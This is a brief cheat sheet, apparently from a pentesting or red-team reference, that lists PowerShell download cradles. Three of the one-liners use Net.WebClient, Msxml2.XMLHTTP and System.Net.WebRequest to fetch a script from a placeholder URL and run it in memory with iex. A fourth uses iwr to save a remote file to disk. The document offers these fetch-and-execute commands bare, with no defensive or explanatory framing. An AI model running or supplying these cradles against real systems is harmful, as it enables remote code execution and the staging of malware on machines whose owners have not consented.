**Net.WebClient:**
```powershell
iex (New-Object Net.WebClient).DownloadString('<URL>')
```

**Msxml2.XMLHTTP:**
```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','<URL>',$false); $h.send(); iex $h.responseText
```

**System.Net.WebRequest:**
```powershell
$wr = [System.Net.WebRequest]::Create('<URL>'); $r = $wr.GetResponse(); iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

**iwr:**
```powershell
iwr '<url>' -OutFile '<Path>'
```